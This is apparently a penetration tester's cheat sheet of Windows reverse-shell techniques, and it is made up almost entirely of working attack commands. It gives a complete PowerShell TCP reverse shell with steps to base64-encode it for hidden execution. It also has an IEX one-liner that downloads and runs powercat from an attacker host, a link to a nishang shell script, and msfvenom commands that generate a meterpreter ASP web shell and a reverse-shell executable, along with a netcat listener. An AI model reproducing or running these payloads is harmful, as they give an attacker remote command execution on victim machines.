## POWERSHELL ONELINER

```powershell
pwsh
$Text = '$client = New-ObjectSystem.Net.Sockets.TCPClient("192.168.45.203",4444);$stream=$client.GetStream();[byte[]] $bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};$client.Close()'
    
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) (Encoding to Base64 since it has many special chars)

$EncodedText = [Convert]::ToBase64String($Bytes)

$EncodedText (paste this out put in cmd parameter)
    
powershell -enc "encodeddata"
```
    
## POWERCAT:
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1

Host Python server

Start listener

IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.203:800/powercat.ps1');powercat -c 192.168.45.203 -p 4444 -e powershell (make sure to URL encode)
```
    
## NC:
```
find / -name nc.exe 2>/dev/null

https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```
## JSP or ASP Shell Gen
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
```

## EXE File Gen
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=kaliip LPORT=port -f exe -o reverse.exe 
nc -lvnp 4444  
on windows run reverse.exe
```